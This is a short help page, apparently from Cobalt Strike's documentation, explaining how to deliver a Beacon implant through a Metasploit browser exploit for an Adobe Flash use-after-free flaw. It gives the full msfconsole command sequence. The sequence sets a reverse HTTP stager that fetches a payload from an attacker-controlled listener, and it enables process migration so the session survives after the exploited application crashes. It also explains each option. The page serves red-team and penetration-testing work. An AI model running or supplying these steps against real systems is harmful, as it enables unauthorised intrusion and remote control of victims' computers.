# Deliver Beacon with a Metasploit Framework Exploit

#### You may use a Metasploit Framework exploit to deliver Cobalt Strike’s Beacon. The [Beacon payload](https://www.cobaltstrike.com/help-beacon) is compatible with the [Metasploit Framework’s staging protocol](https://www.cobaltstrike.com/2013/06/28/staged-payloads-what-pen-testers-should-know/). To deliver a Beacon with a Metasploit Framework exploit, type:

<pre>
use exploit/multi/browser/adobe_flash_hacking_team_uaf
set PAYLOAD windows/meterpreter/reverse_http
set LHOST [Cobalt Strike's IP or hostname]
set LPORT 80
set DisablePayloadHandler True
set PrependMigrate True
exploit -j
</pre>

Here’s an explanation of these commands:

1. Use the exploit module you want to deliver Beacon with.

2. Set PAYLOAD to windows/meterpreter/reverse_http for an HTTP Beacon. Set PAYLOAD to windows/meterpreter/reverse_https for an HTTPS Beacon. You’re not really delivering Meterpreter here. You’re telling the Metasploit Framework to generate an HTTP (or HTTPS) stager to download a payload from the specified LHOST/LPORT.

3. Set LHOST and LPORT to point to your Cobalt Strike listener. Cobalt Strike will know what to do when it receives a request from a Metasploit Framework stager.

4. Set DisablePayloadHandler to True. This tells the Metasploit Framework that it does not need to create a handler within the Metasploit Framework to service a payload connection.

5. Set PrependMigrate to True. This option tells the Metasploit Framework to modify its stager to migrate to another process, immediately after exploitation. This option is very important for client-side attacks. It allows your session to survive if the exploited application crashes or closes.

#### [POC Video](https://youtu.be/fnCLdPOmZOk)